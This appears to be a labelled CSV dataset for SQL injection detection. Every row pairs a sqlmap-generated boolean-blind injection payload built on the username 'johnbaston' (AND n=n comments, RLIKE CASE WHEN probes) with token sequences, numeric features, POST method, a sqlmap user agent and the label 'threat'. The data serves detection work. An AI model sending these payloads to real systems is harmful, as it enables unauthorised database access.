"johnbaston"" AND 1213=1213-- qLdt",STR DQUT AND INT EQ INT DSCMT STR,0.5714285714285714 0.7142857142857142 0.8571428571428571 1.0 1.0 0.8571428571428571 0.7142857142857142 0.5714285714285714,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"johnbaston"" AND 1213=1213-- qLdt",STR DQUT AND INT EQ INT DSCMT STR,0.5714285714285714 0.7142857142857142 0.8571428571428571 1.0 1.0 0.8571428571428571 0.7142857142857142 0.5714285714285714,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston%') AND 3996=1660-- wcUg,STR PRCNT SQUT RPRN AND INT EQ INT DSCMT STR,0.4444444444444444 0.5555555555555556 0.6666666666666666 0.7777777777777777 0.8888888888888888 0.8888888888888888 0.7777777777777777 0.6666666666666666 0.5555555555555556 0.4444444444444444,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston%') AND 3996=1660-- wcUg,STR PRCNT SQUT RPRN AND INT EQ INT DSCMT STR,0.4444444444444444 0.5555555555555556 0.6666666666666666 0.7777777777777777 0.8888888888888888 0.8888888888888888 0.7777777777777777 0.6666666666666666 0.5555555555555556 0.4444444444444444,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston%') AND 1213=1213-- nYPX,STR PRCNT SQUT RPRN AND INT EQ INT DSCMT STR,0.4444444444444444 0.5555555555555556 0.6666666666666666 0.7777777777777777 0.8888888888888888 0.8888888888888888 0.7777777777777777 0.6666666666666666 0.5555555555555556 0.4444444444444444,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston%') AND 1213=1213-- nYPX,STR PRCNT SQUT RPRN AND INT EQ INT DSCMT STR,0.4444444444444444 0.5555555555555556 0.6666666666666666 0.7777777777777777 0.8888888888888888 0.8888888888888888 0.7777777777777777 0.6666666666666666 0.5555555555555556 0.4444444444444444,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston%' AND 6830=1849-- qCMY,STR PRCNT SQUT AND INT EQ INT DSCMT STR,0.5 0.625 0.75 0.875 1.0 0.875 0.75 0.625 0.5,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston%' AND 6830=1849-- qCMY,STR PRCNT SQUT AND INT EQ INT DSCMT STR,0.5 0.625 0.75 0.875 1.0 0.875 0.75 0.625 0.5,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston%' AND 1213=1213-- soqe,STR PRCNT SQUT AND INT EQ INT DSCMT STR,0.5 0.625 0.75 0.875 1.0 0.875 0.75 0.625 0.5,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston) AND 7285=8500-- iLLH,STR RPRN AND INT EQ INT DSCMT STR,0.5714285714285714 0.7142857142857142 0.8571428571428571 1.0 1.0 0.8571428571428571 0.7142857142857142 0.5714285714285714,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston) AND 7285=8500-- iLLH,STR RPRN AND INT EQ INT DSCMT STR,0.5714285714285714 0.7142857142857142 0.8571428571428571 1.0 1.0 0.8571428571428571 0.7142857142857142 0.5714285714285714,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston) AND 1213=1213-- XRLV,STR RPRN AND INT EQ INT DSCMT STR,0.5714285714285714 0.7142857142857142 0.8571428571428571 1.0 1.0 0.8571428571428571 0.7142857142857142 0.5714285714285714,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston)) AND 6025=9494-- FZPB,STR RPRN RPRN AND INT EQ INT DSCMT STR,0.5 0.625 0.75 0.875 1.0 0.875 0.75 0.625 0.5,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston)) AND 6025=9494-- FZPB,STR RPRN RPRN AND INT EQ INT DSCMT STR,0.5 0.625 0.75 0.875 1.0 0.875 0.75 0.625 0.5,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston AND 4395=3508-- pOWi,STR AND INT EQ INT DSCMT STR,0.6666666666666666 0.8333333333333333 1.0 1.0 1.0 0.8333333333333333 0.6666666666666666,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston AND 1213=1213-- nott,STR AND INT EQ INT DSCMT STR,0.6666666666666666 0.8333333333333333 1.0 1.0 1.0 0.8333333333333333 0.6666666666666666,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston AND 1213=1213-- nott,STR AND INT EQ INT DSCMT STR,0.6666666666666666 0.8333333333333333 1.0 1.0 1.0 0.8333333333333333 0.6666666666666666,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston AND 3656=5214-- RnQG,STR AND INT EQ INT DSCMT STR,0.6666666666666666 0.8333333333333333 1.0 1.0 1.0 0.8333333333333333 0.6666666666666666,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston AND 3656=5214-- RnQG,STR AND INT EQ INT DSCMT STR,0.6666666666666666 0.8333333333333333 1.0 1.0 1.0 0.8333333333333333 0.6666666666666666,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston') RLIKE (SELECT (CASE WHEN (2512=3859) THEN 0x6a6f686e626173746f6e ELSE 0x28 END)) AND ('Dvdg'='Dvdg,STR SQUT RPRN RLIKE SELECT CASE WHEN INT EQ INT THEN HEX ELSE HEX END AND LPRN SQUT STR SQUT EQ SQUT STR,0.18181818181818182 0.2272727272727273 0.2727272727272727 0.3181818181818182 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.3181818181818182 0.2727272727272727 0.2272727272727273 0.18181818181818182,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston') RLIKE (SELECT (CASE WHEN (2512=3859) THEN 0x6a6f686e626173746f6e ELSE 0x28 END)) AND ('Dvdg'='Dvdg,STR SQUT RPRN RLIKE SELECT CASE WHEN INT EQ INT THEN HEX ELSE HEX END AND LPRN SQUT STR SQUT EQ SQUT STR,0.18181818181818182 0.2272727272727273 0.2727272727272727 0.3181818181818182 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.3181818181818182 0.2727272727272727 0.2272727272727273 0.18181818181818182,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston') RLIKE (SELECT (CASE WHEN (3899=3899) THEN 0x6a6f686e626173746f6e ELSE 0x28 END)) AND ('mBAT'='mBAT,STR SQUT RPRN RLIKE SELECT CASE WHEN INT EQ INT THEN HEX ELSE HEX END AND LPRN SQUT STR SQUT EQ SQUT STR,0.18181818181818182 0.2272727272727273 0.2727272727272727 0.3181818181818182 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.3181818181818182 0.2727272727272727 0.2272727272727273 0.18181818181818182,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston') RLIKE (SELECT (CASE WHEN (3899=3899) THEN 0x6a6f686e626173746f6e ELSE 0x28 END)) AND ('mBAT'='mBAT,STR SQUT RPRN RLIKE SELECT CASE WHEN INT EQ INT THEN HEX ELSE HEX END AND LPRN SQUT STR SQUT EQ SQUT STR,0.18181818181818182 0.2272727272727273 0.2727272727272727 0.3181818181818182 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.3181818181818182 0.2727272727272727 0.2272727272727273 0.18181818181818182,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston')) RLIKE (SELECT (CASE WHEN (9506=9399) THEN 0x6a6f686e626173746f6e ELSE 0x28 END)) AND (('vXfB'='vXfB,STR SQUT RPRN RPRN RLIKE SELECT CASE WHEN INT EQ INT THEN HEX ELSE HEX END AND LPRN LPRN SQUT STR SQUT EQ SQUT STR,0.16666666666666666 0.20833333333333331 0.25 0.29166666666666663 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.29166666666666663 0.25 0.20833333333333331 0.16666666666666666,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston')) RLIKE (SELECT (CASE WHEN (9506=9399) THEN 0x6a6f686e626173746f6e ELSE 0x28 END)) AND (('vXfB'='vXfB,STR SQUT RPRN RPRN RLIKE SELECT CASE WHEN INT EQ INT THEN HEX ELSE HEX END AND LPRN LPRN SQUT STR SQUT EQ SQUT STR,0.16666666666666666 0.20833333333333331 0.25 0.29166666666666663 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.29166666666666663 0.25 0.20833333333333331 0.16666666666666666,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston')) RLIKE (SELECT (CASE WHEN (3899=3899) THEN 0x6a6f686e626173746f6e ELSE 0x28 END)) AND (('uEXM'='uEXM,STR SQUT RPRN RPRN RLIKE SELECT CASE WHEN INT EQ INT THEN HEX ELSE HEX END AND LPRN LPRN SQUT STR SQUT EQ SQUT STR,0.16666666666666666 0.20833333333333331 0.25 0.29166666666666663 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.29166666666666663 0.25 0.20833333333333331 0.16666666666666666,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston')) RLIKE (SELECT (CASE WHEN (3899=3899) THEN 0x6a6f686e626173746f6e ELSE 0x28 END)) AND (('uEXM'='uEXM,STR SQUT RPRN RPRN RLIKE SELECT CASE WHEN INT EQ INT THEN HEX ELSE HEX END AND LPRN LPRN SQUT STR SQUT EQ SQUT STR,0.16666666666666666 0.20833333333333331 0.25 0.29166666666666663 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.29166666666666663 0.25 0.20833333333333331 0.16666666666666666,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston' RLIKE (SELECT (CASE WHEN (3899=3899) THEN 0x6a6f686e626173746f6e ELSE 0x28 END)) AND 'qDHH'='qDHH,STR SQUT RLIKE SELECT CASE WHEN INT EQ INT THEN HEX ELSE HEX END AND SQUT STR SQUT EQ SQUT STR,0.2 0.25 0.30000000000000004 0.35000000000000003 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.35000000000000003 0.30000000000000004 0.25 0.2,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston' RLIKE (SELECT (CASE WHEN (3899=3899) THEN 0x6a6f686e626173746f6e ELSE 0x28 END)) AND 'qDHH'='qDHH,STR SQUT RLIKE SELECT CASE WHEN INT EQ INT THEN HEX ELSE HEX END AND SQUT STR SQUT EQ SQUT STR,0.2 0.25 0.30000000000000004 0.35000000000000003 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.35000000000000003 0.30000000000000004 0.25 0.2,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston') RLIKE (SELECT (CASE WHEN (3899=3899) THEN 0x6a6f686e626173746f6e ELSE 0x28 END)) AND ('MiRf' LIKE 'MiRf,STR SQUT RPRN RLIKE SELECT CASE WHEN INT EQ INT THEN HEX ELSE HEX END AND LPRN SQUT STR SQUT LIKE SQUT STR,0.18181818181818182 0.2272727272727273 0.2727272727272727 0.3181818181818182 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.3181818181818182 0.2727272727272727 0.2272727272727273 0.18181818181818182,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston') RLIKE (SELECT (CASE WHEN (3899=3899) THEN 0x6a6f686e626173746f6e ELSE 0x28 END)) AND ('MiRf' LIKE 'MiRf,STR SQUT RPRN RLIKE SELECT CASE WHEN INT EQ INT THEN HEX ELSE HEX END AND LPRN SQUT STR SQUT LIKE SQUT STR,0.18181818181818182 0.2272727272727273 0.2727272727272727 0.3181818181818182 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.3181818181818182 0.2727272727272727 0.2272727272727273 0.18181818181818182,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston' RLIKE (SELECT (CASE WHEN (6877=3624) THEN 0x6a6f686e626173746f6e ELSE 0x28 END)) AND 'rgxG' LIKE 'rgxG,STR SQUT RLIKE SELECT CASE WHEN INT EQ INT THEN HEX ELSE HEX END AND SQUT STR SQUT LIKE SQUT STR,0.2 0.25 0.30000000000000004 0.35000000000000003 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.35000000000000003 0.30000000000000004 0.25 0.2,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston' RLIKE (SELECT (CASE WHEN (6877=3624) THEN 0x6a6f686e626173746f6e ELSE 0x28 END)) AND 'rgxG' LIKE 'rgxG,STR SQUT RLIKE SELECT CASE WHEN INT EQ INT THEN HEX ELSE HEX END AND SQUT STR SQUT LIKE SQUT STR,0.2 0.25 0.30000000000000004 0.35000000000000003 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.35000000000000003 0.30000000000000004 0.25 0.2,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston' RLIKE (SELECT (CASE WHEN (3899=3899) THEN 0x6a6f686e626173746f6e ELSE 0x28 END)) AND 'Ptvr' LIKE 'Ptvr,STR SQUT RLIKE SELECT CASE WHEN INT EQ INT THEN HEX ELSE HEX END AND SQUT STR SQUT LIKE SQUT STR,0.2 0.25 0.30000000000000004 0.35000000000000003 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.35000000000000003 0.30000000000000004 0.25 0.2,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston' RLIKE (SELECT (CASE WHEN (3899=3899) THEN 0x6a6f686e626173746f6e ELSE 0x28 END)) AND 'Ptvr' LIKE 'Ptvr,STR SQUT RLIKE SELECT CASE WHEN INT EQ INT THEN HEX ELSE HEX END AND SQUT STR SQUT LIKE SQUT STR,0.2 0.25 0.30000000000000004 0.35000000000000003 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.35000000000000003 0.30000000000000004 0.25 0.2,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"johnbaston"") RLIKE (SELECT (CASE WHEN (3546=4976) THEN 0x6a6f686e626173746f6e ELSE 0x28 END)) AND (""hlSy""=""hlSy",STR DQUT RPRN RLIKE SELECT CASE WHEN INT EQ INT THEN HEX ELSE HEX END AND LPRN DQUT STR DQUT EQ DQUT STR,0.18181818181818182 0.2272727272727273 0.2727272727272727 0.3181818181818182 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.3181818181818182 0.2727272727272727 0.2272727272727273 0.18181818181818182,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"johnbaston"") RLIKE (SELECT (CASE WHEN (3546=4976) THEN 0x6a6f686e626173746f6e ELSE 0x28 END)) AND (""hlSy""=""hlSy",STR DQUT RPRN RLIKE SELECT CASE WHEN INT EQ INT THEN HEX ELSE HEX END AND LPRN DQUT STR DQUT EQ DQUT STR,0.18181818181818182 0.2272727272727273 0.2727272727272727 0.3181818181818182 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.3181818181818182 0.2727272727272727 0.2272727272727273 0.18181818181818182,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"johnbaston"") RLIKE (SELECT (CASE WHEN (3899=3899) THEN 0x6a6f686e626173746f6e ELSE 0x28 END)) AND (""lNdo""=""lNdo",STR DQUT RPRN RLIKE SELECT CASE WHEN INT EQ INT THEN HEX ELSE HEX END AND LPRN DQUT STR DQUT EQ DQUT STR,0.18181818181818182 0.2272727272727273 0.2727272727272727 0.3181818181818182 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.3181818181818182 0.2727272727272727 0.2272727272727273 0.18181818181818182,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"johnbaston"") RLIKE (SELECT (CASE WHEN (3899=3899) THEN 0x6a6f686e626173746f6e ELSE 0x28 END)) AND (""lNdo""=""lNdo",STR DQUT RPRN RLIKE SELECT CASE WHEN INT EQ INT THEN HEX ELSE HEX END AND LPRN DQUT STR DQUT EQ DQUT STR,0.18181818181818182 0.2272727272727273 0.2727272727272727 0.3181818181818182 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.3181818181818182 0.2727272727272727 0.2272727272727273 0.18181818181818182,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"johnbaston"" RLIKE (SELECT (CASE WHEN (3037=7423) THEN 0x6a6f686e626173746f6e ELSE 0x28 END)) AND ""sBhJ""=""sBhJ",STR DQUT RLIKE SELECT CASE WHEN INT EQ INT THEN HEX ELSE HEX END AND DQUT STR DQUT EQ DQUT STR,0.2 0.25 0.30000000000000004 0.35000000000000003 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.35000000000000003 0.30000000000000004 0.25 0.2,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"johnbaston"" RLIKE (SELECT (CASE WHEN (3037=7423) THEN 0x6a6f686e626173746f6e ELSE 0x28 END)) AND ""sBhJ""=""sBhJ",STR DQUT RLIKE SELECT CASE WHEN INT EQ INT THEN HEX ELSE HEX END AND DQUT STR DQUT EQ DQUT STR,0.2 0.25 0.30000000000000004 0.35000000000000003 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.35000000000000003 0.30000000000000004 0.25 0.2,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"johnbaston"" RLIKE (SELECT (CASE WHEN (3899=3899) THEN 0x6a6f686e626173746f6e ELSE 0x28 END)) AND ""Gyue""=""Gyue",STR DQUT RLIKE SELECT CASE WHEN INT EQ INT THEN HEX ELSE HEX END AND DQUT STR DQUT EQ DQUT STR,0.2 0.25 0.30000000000000004 0.35000000000000003 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.35000000000000003 0.30000000000000004 0.25 0.2,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"johnbaston"" RLIKE (SELECT (CASE WHEN (3899=3899) THEN 0x6a6f686e626173746f6e ELSE 0x28 END)) AND ""Gyue""=""Gyue",STR DQUT RLIKE SELECT CASE WHEN INT EQ INT THEN HEX ELSE HEX END AND DQUT STR DQUT EQ DQUT STR,0.2 0.25 0.30000000000000004 0.35000000000000003 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.35000000000000003 0.30000000000000004 0.25 0.2,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston%') RLIKE (SELECT (CASE WHEN (7525=2950) THEN 0x6a6f686e626173746f6e ELSE 0x28 END)) AND ('%'=',STR PRCNT SQUT RPRN RLIKE SELECT CASE WHEN INT EQ INT THEN HEX ELSE HEX END AND LPRN SQUT PRCNT SQUT EQ SQUT,0.18181818181818182 0.2272727272727273 0.2727272727272727 0.3181818181818182 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.3181818181818182 0.2727272727272727 0.2272727272727273 0.18181818181818182,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston%') RLIKE (SELECT (CASE WHEN (7525=2950) THEN 0x6a6f686e626173746f6e ELSE 0x28 END)) AND ('%'=',STR PRCNT SQUT RPRN RLIKE SELECT CASE WHEN INT EQ INT THEN HEX ELSE HEX END AND LPRN SQUT PRCNT SQUT EQ SQUT,0.18181818181818182 0.2272727272727273 0.2727272727272727 0.3181818181818182 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.3181818181818182 0.2727272727272727 0.2272727272727273 0.18181818181818182,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston%') RLIKE (SELECT (CASE WHEN (3899=3899) THEN 0x6a6f686e626173746f6e ELSE 0x28 END)) AND ('%'=',STR PRCNT SQUT RPRN RLIKE SELECT CASE WHEN INT EQ INT THEN HEX ELSE HEX END AND LPRN SQUT PRCNT SQUT EQ SQUT,0.18181818181818182 0.2272727272727273 0.2727272727272727 0.3181818181818182 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.3181818181818182 0.2727272727272727 0.2272727272727273 0.18181818181818182,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston%') RLIKE (SELECT (CASE WHEN (3899=3899) THEN 0x6a6f686e626173746f6e ELSE 0x28 END)) AND ('%'=',STR PRCNT SQUT RPRN RLIKE SELECT CASE WHEN INT EQ INT THEN HEX ELSE HEX END AND LPRN SQUT PRCNT SQUT EQ SQUT,0.18181818181818182 0.2272727272727273 0.2727272727272727 0.3181818181818182 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.3181818181818182 0.2727272727272727 0.2272727272727273 0.18181818181818182,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
